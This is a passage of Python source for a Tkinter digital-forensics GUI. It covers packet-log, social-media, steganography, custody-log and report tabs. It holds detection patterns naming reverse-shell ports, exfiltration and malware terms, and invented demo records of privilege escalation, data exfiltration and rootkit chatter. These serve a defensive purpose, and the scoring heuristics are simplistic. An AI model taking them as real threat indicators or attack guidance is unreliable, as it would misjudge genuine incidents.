        tf, self.tree = scrolled_tree(self, cols, heads, heights=22)
        self.tree.column("time",  width=90)
        self.tree.column("proto", width=55)
        self.tree.column("src",   width=155)
        self.tree.column("dst",   width=155)
        self.tree.column("flags", width=90)
        self.tree.column("score", width=65)
        self.tree.column("info",  width=280)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

        self.all_packets = []

    def _add(self, pkts):
        self.all_packets.extend(pkts)
        self._filter()

    def _filter(self):
        self.tree.delete(*self.tree.get_children())
        sus_only = self.sus_var.get()
        for p in self.all_packets:
            if sus_only and not p.get("sus"): continue
            tag = "CRITICAL" if p["score"] >= 70 else "WARNING" if p["score"] >= 40 else ""
            self.tree.insert("","end",
                values=(p["ts"],p["proto"],p["src"],p["dst"],p["flags"],p["score"],p["info"]),
                tags=(tag,))

    def _upload(self):
        p = filedialog.askopenfilename(filetypes=[("CSV/Log","*.csv *.txt *.log"),("All","*.*")])
        if not p: return
        pkts = []
        with open(p,"r",errors="ignore") as f:
            for i, line in enumerate(f):
                if i == 0 and "time" in line.lower(): continue
                cols = line.split(",")
                if len(cols) < 4: continue
                sus = bool(re.search(r"185\.220|45\.142|4444|31337|exfil|payload|encoded", line, re.I))
                pkts.append({"ts":cols[0].strip(),"proto":cols[4].strip() if len(cols)>4 else "TCP",
                             "src":cols[2].strip(),"dst":cols[3].strip(),
                             "flags":"","score":80 if sus else 5,"sus":sus,
                             "info":(cols[6].strip() if len(cols)>6 else "")[:60]})
        self._add(pkts)
        self.custody.log("PACKETS_LOADED", os.path.basename(p), f"{len(pkts)} packets")

    def _demo(self):
        demo = [
            {"ts":"02:18:11","proto":"TCP","src":"192.168.4.87:54301","dst":"10.0.0.1:22","flags":"SYN,ACK","score":20,"sus":False,"info":"SSH handshake"},
            {"ts":"02:21:07","proto":"TCP","src":"10.0.0.1:1337","dst":"10.0.0.1:22","flags":"PSH,ACK","score":90,"sus":True,"info":"sudo /bin/bash privilege escalation"},
            {"ts":"03:01:44","proto":"TCP","src":"10.0.0.1:52100","dst":"185.220.101.9:443","flags":"PSH,ACK","score":95,"sus":True,"info":"TLS — 482MB exfiltration"},
            {"ts":"03:20:08","proto":"UDP","src":"10.0.0.5:44521","dst":"8.8.8.8:53","flags":"","score":70,"sus":True,"info":"DNS: exfil-drop.onion.to"},
            {"ts":"04:18:33","proto":"TCP","src":"185.220.101.9:22","dst":"10.0.0.1:50100","flags":"SYN,ACK","score":95,"sus":True,"info":"Inbound SSH from flagged IP"},
            {"ts":"05:01:44","proto":"TCP","src":"10.0.0.1:1024","dst":"10.0.0.1:80","flags":"PSH,ACK","score":88,"sus":True,"info":"iptables -F flush"},
            {"ts":"01:30:00","proto":"UDP","src":"10.0.0.2:45100","dst":"1.1.1.1:53","flags":"","score":0,"sus":False,"info":"DNS: google.com"},
        ]
        self._add(demo)
        self.custody.log("DEMO_PACKETS", "demo", f"{len(demo)} packets")


# ─────────────────────────────────────────────────────────────────────────────
#  Social Media Feed
# ─────────────────────────────────────────────────────────────────────────────
SOCIAL_KW = ["exfil","payload","shell","exploit","backdoor","ransom","rootkit","keylog",
             "c2","wiped","mission done","stay dark","bomb","weapon","cocaine","crypto wallet"]

class SocialTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Social Media Evidence Feed").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload JSON/CSV social media export, or add messages manually.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload JSON/CSV",  self._upload, color=COLORS["green"]).pack(side="left", padx=4)
        btn(tr, "Load Demo",        self._demo,   color=COLORS["txt2"]).pack(side="left", padx=4)
        self.flag_var = tk.BooleanVar()
        tk.Checkbutton(tr, text="Flagged only", variable=self.flag_var, command=self._filter,
                       bg=COLORS["bg"], fg=COLORS["txt2"], selectcolor=COLORS["bg3"],
                       activebackground=COLORS["bg"], font=("Segoe UI",9)).pack(side="left", padx=8)

        # Add manual row
        ar = tk.Frame(self, bg=COLORS["bg"])
        ar.pack(fill="x", padx=16, pady=4)
        self.plat_e = entry(ar, width=10, placeholder="Platform"); self.plat_e.pack(side="left", padx=4)
        self.user_e = entry(ar, width=14, placeholder="Username"); self.user_e.pack(side="left", padx=4)
        self.msg_e  = entry(ar, width=50, placeholder="Message text..."); self.msg_e.pack(side="left", padx=4)
        btn(ar, "Add", self._add_manual, color=COLORS["accent"]).pack(side="left", padx=4)

        cols = ("platform","username","timestamp","flagged","keywords","message")
        heads = ("Platform","Username","Timestamp","Flagged","Keywords","Message")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=18)
        self.tree.column("platform",  width=90)
        self.tree.column("username",  width=130)
        self.tree.column("timestamp", width=135)
        self.tree.column("flagged",   width=70)
        self.tree.column("keywords",  width=160)
        self.tree.column("message",   width=320)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))
        self.all_msgs = []

    def _is_flagged(self, text):
        return any(k in text.lower() for k in SOCIAL_KW)

    def _get_kw(self, text):
        return ", ".join(k for k in SOCIAL_KW if k in text.lower())

    def _filter(self):
        self.tree.delete(*self.tree.get_children())
        fo = self.flag_var.get()
        for m in self.all_msgs:
            if fo and not m["flagged"]: continue
            tag = "CRITICAL" if m["flagged"] else ""
            self.tree.insert("","end",
                values=(m["platform"],m["username"],m.get("ts",""),
                        "YES" if m["flagged"] else "no",
                        m.get("keywords",""), m["message"][:140]),
                tags=(tag,))

    def _add_manual(self):
        plat = self.plat_e.get().strip() or "manual"
        user = self.user_e.get().strip() or "unknown"
        msg  = self.msg_e.get().strip()
        if not msg: return
        flagged = self._is_flagged(msg)
        self.all_msgs.append({"platform":plat,"username":user,"message":msg,
                               "ts":datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
                               "flagged":flagged,"keywords":self._get_kw(msg)})
        self.msg_e.delete(0,"end")
        self._filter()
        self.custody.log("MESSAGE_ADDED" if not flagged else "FLAGGED_MESSAGE",
                         f"{plat}/{user}", msg[:60])

    def _upload(self):
        p = filedialog.askopenfilename(filetypes=[("JSON/CSV","*.json *.csv *.txt"),("All","*.*")])
        if not p: return
        with open(p,"r",errors="ignore") as f: content = f.read()
        msgs = []
        try:
            data = json.loads(content)
            items = data if isinstance(data, list) else data.get("messages", [])
            for item in items:
                msg = item.get("message") or item.get("text") or item.get("content","")
                msgs.append({"platform":item.get("platform","unknown"),
                             "username":item.get("username") or item.get("user","unknown"),
                             "message":msg, "ts":item.get("ts") or item.get("timestamp",""),
                             "flagged":self._is_flagged(msg), "keywords":self._get_kw(msg)})
        except Exception:
            for line in content.splitlines():
                parts = line.split(",",3)
                if len(parts) >= 3:
                    msg = parts[-1].strip()
                    msgs.append({"platform":parts[0].strip(),"username":parts[1].strip(),
                                 "message":msg,"ts":parts[2].strip() if len(parts)>3 else "",
                                 "flagged":self._is_flagged(msg),"keywords":self._get_kw(msg)})
        self.all_msgs.extend(msgs)
        flagged_count = sum(1 for m in msgs if m["flagged"])
        self._filter()
        self.custody.log("SOCIAL_UPLOADED", os.path.basename(p),
                         f"{len(msgs)} messages, {flagged_count} flagged")

    def _demo(self):
        demo_msgs = [
            {"platform":"twitter","username":"@shadow_0x4a","message":"mission done. files are out. cleaning now","ts":"2024-11-08 02:17"},
            {"platform":"telegram","username":"suspect_chan","message":"uploaded exfil_v2.zip to drop. confirm receipt. stay dark","ts":"2024-11-08 02:19"},
            {"platform":"reddit","username":"u/throwaway_8871","message":"logs wiped clean. rootkit installed via cron","ts":"2024-11-08 02:45"},
            {"platform":"telegram","username":"anon_buyer","message":"send me the payload shell. BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf","ts":"2024-11-08 01:30"},
        ]
        for m in demo_msgs:
            m["flagged"] = self._is_flagged(m["message"])
            m["keywords"] = self._get_kw(m["message"])
        self.all_msgs.extend(demo_msgs)
        self._filter()
        self.custody.log("DEMO_SOCIAL", "demo", f"{len(demo_msgs)} messages loaded")


# ─────────────────────────────────────────────────────────────────────────────
#  Steganography Detector
# ─────────────────────────────────────────────────────────────────────────────
class StegTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Steganography Detector").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Upload image files. Checks file size/dimension ratio, header anomalies, and appended data.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Upload Image(s)", self._upload, color=COLORS["green"]).pack(side="left", padx=4)

        cols = ("filename","size","dims","ratio","flags","verdict")
        heads = ("Filename","Size","Dimensions","Size Ratio","Anomaly Flags","Verdict")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=16)
        self.tree.column("filename", width=180)
        self.tree.column("size",     width=80)
        self.tree.column("dims",     width=120)
        self.tree.column("ratio",    width=90)
        self.tree.column("flags",    width=300)
        self.tree.column("verdict",  width=110)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _upload(self):
        paths = filedialog.askopenfilenames(
            filetypes=[("Images","*.jpg *.jpeg *.png *.bmp *.gif *.tiff"),("All","*.*")])
        for p in paths:
            self._analyze(p)

    def _analyze(self, path):
        try:
            size = os.path.getsize(path)
            size_kb = size / 1024
            w, h = 0, 0
            with open(path,"rb") as f:
                header = f.read(32)
                # Try to read PNG dims
                if header[:4] == bytes.fromhex("89504E47"):
                    import struct
                    f.seek(16)
                    w, h = struct.unpack(">II", f.read(8))

            expected_kb = (w * h * 3 / 1024 / 10) if w and h else size_kb * 0.8
            ratio = size_kb / max(expected_kb, 1)
            flags = []
            if ratio > 1.6: flags.append(f"Size {ratio:.1f}x larger than expected")
            # Check for appended data after JPEG end
            with open(path,"rb") as f:
                data = f.read()
            if b"\xff\xd9" in data[:-2]:
                idx = data.rfind(b"\xff\xd9")
                if idx < len(data) - 2:
                    flags.append(f"{len(data)-idx-2} bytes after JPEG EOF")
            verdict = "SUSPICIOUS" if flags else "CLEAN"
            tag = "CRITICAL" if verdict == "SUSPICIOUS" else "OK"
            dims_str = f"{w}x{h}" if w else "N/A"
            self.tree.insert("","end",
                values=(os.path.basename(path), f"{size_kb:.1f} KB",
                        dims_str, f"{ratio:.2f}x",
                        "; ".join(flags) if flags else "—", verdict),
                tags=(tag,))
            self.custody.log("STEG_ANALYSIS", os.path.basename(path),
                             f"{verdict} — {'; '.join(flags) if flags else 'clean'}")
        except Exception as e:
            self.tree.insert("","end", values=(os.path.basename(path),"","","","ERROR: "+str(e),"—"))


# ─────────────────────────────────────────────────────────────────────────────
#  Chain of Custody Log
# ─────────────────────────────────────────────────────────────────────────────
class CustodyTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self.root = root
        self._build()
        # refresh every time the tab is shown
        self.bind("<Visibility>", lambda e: self._refresh())

    def _build(self):
        heading(self, "Chain of Custody Log").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Every analyst action — file uploads, analyses, hash computations — is automatically recorded here.", small=True).pack(anchor="w", padx=16)
        tr = tk.Frame(self, bg=COLORS["bg"])
        tr.pack(fill="x", padx=16, pady=8)
        btn(tr, "Refresh", self._refresh, color=COLORS["accent"]).pack(side="left", padx=4)
        btn(tr, "Export CSV", self._export, color=COLORS["green"]).pack(side="left", padx=4)
        self.count_var = tk.StringVar(value="0 entries")
        tk.Label(tr, textvariable=self.count_var, bg=COLORS["bg"], fg=COLORS["txt3"],
                 font=("Consolas",9)).pack(side="right", padx=8)

        cols = ("id","ts","analyst","action","target","details")
        heads = ("#","Timestamp","Analyst","Action","Target","Details")
        tf, self.tree = scrolled_tree(self, cols, heads, heights=22)
        self.tree.column("id",      width=40)
        self.tree.column("ts",      width=150)
        self.tree.column("analyst", width=110)
        self.tree.column("action",  width=180)
        self.tree.column("target",  width=160)
        self.tree.column("details", width=320)
        tf.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _refresh(self):
        self.tree.delete(*self.tree.get_children())
        for e in self.custody.entries:
            self.tree.insert("","end",
                values=(e["id"],e["ts"],e["analyst"],e["action"],e["target"],e["details"]),
                tags=("INFO",))
        self.count_var.set(f"{len(self.custody.entries)} entries")

    def _export(self):
        p = filedialog.asksaveasfilename(defaultextension=".csv",
                                          filetypes=[("CSV","*.csv")])
        if not p: return
        with open(p,"w",newline="") as f:
            w = csv.writer(f)
            w.writerow(["ID","Timestamp","Analyst","Action","Target","Details"])
            for e in self.custody.entries:
                w.writerow([e["id"],e["ts"],e["analyst"],e["action"],e["target"],e["details"]])
        messagebox.showinfo("Exported", f"Custody log saved to:\n{p}")


# ─────────────────────────────────────────────────────────────────────────────
#  Report Generator
# ─────────────────────────────────────────────────────────────────────────────
class ReportTab(tk.Frame):
    def __init__(self, parent, custody, root):
        super().__init__(parent, bg=COLORS["bg"])
        self.custody = custody
        self._build()

    def _build(self):
        heading(self, "Evidence Report Generator").pack(anchor="w", padx=16, pady=(14,4))
        label(self, "Generates a plain-text + CSV forensic report with all findings and chain of custody.", small=True).pack(anchor="w", padx=16)

        cf = card_frame(self)
        cf.pack(fill="x", padx=16, pady=10)
        fields = [("Case ID", "CS-2024-0001"), ("Analyst", "EXAMINER_01"),
                  ("Case Title","Cybercrime Investigation"), ("Classification","CONFIDENTIAL")]
        self.vars = {}
        for lbl, default in fields:
            row = tk.Frame(cf, bg=COLORS["bg2"])
            row.pack(fill="x", padx=10, pady=4)
            tk.Label(row, text=f"{lbl}:", bg=COLORS["bg2"], fg=COLORS["txt2"],
                     font=("Segoe UI",10), width=14, anchor="w").pack(side="left")
            v = tk.StringVar(value=default)
            self.vars[lbl] = v
            tk.Entry(row, textvariable=v, bg=COLORS["bg3"], fg=COLORS["txt"],
                     insertbackground=COLORS["accent"], font=("Consolas",10),
                     relief="flat", bd=4, width=40).pack(side="left")

        btn(self, "Generate Report", self._generate, color=COLORS["green"]).pack(padx=16, pady=10, anchor="w")

        separator(self).pack(fill="x", padx=16, pady=4)
        _, self.preview = text_area(self, height=18)
        self.preview.master.pack(fill="both", expand=True, padx=16, pady=(4,12))

    def _generate(self):
        case_id  = self.vars["Case ID"].get()
        analyst  = self.vars["Analyst"].get()
        title    = self.vars["Case Title"].get()
        cls_     = self.vars["Classification"].get()
        now      = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        lines = [
            "=" * 70,
            f"  CYBERSENTINEL v2 — DIGITAL FORENSICS REPORT",
            "=" * 70,
            f"  Case ID:        {case_id}",
            f"  Case Title:     {title}",
            f"  Analyst:        {analyst}",
            f"  Generated:      {now}",
            f"  Classification: {cls_}",
            "=" * 70, "",
            f"CHAIN OF CUSTODY ({len(self.custody.entries)} entries)",
            "-" * 70,
        ]
        for e in self.custody.entries:
            lines.append(f"  [{e['ts']}] {e['analyst']:15} {e['action']:30} {e['target']}")
        lines += ["", "=" * 70,
                  "  Generated by CyberSentinel v2 — For Law Enforcement Use Only",
                  "=" * 70]

        report_text = "\n".join(lines)
        self.preview.delete("1.0","end")
        self.preview.insert("1.0", report_text)

        # Save
        fname = f"CS_{case_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
        p = filedialog.asksaveasfilename(
            initialfile=fname,
            defaultextension=".txt",
            filetypes=[("Text report","*.txt"),("CSV","*.csv"),("All","*.*")])
        if not p: return

        with open(p,"w") as f:
            f.write(report_text)

        # Also save CSV custody log
        csv_path = p.replace(".txt","_custody.csv")
        with open(csv_path,"w",newline="") as f:
            w = csv.writer(f)
            w.writerow(["ID","Timestamp","Analyst","Action","Target","Details"])
            for e in self.custody.entries:
                w.writerow([e["id"],e["ts"],e["analyst"],e["action"],e["target"],e["details"]])

        self.custody.log("REPORT_GENERATED", fname, f"Analyst: {analyst}")
        messagebox.showinfo("Report Saved",
                            f"Report saved to:\n{p}\n\nCustody CSV:\n{csv_path}")
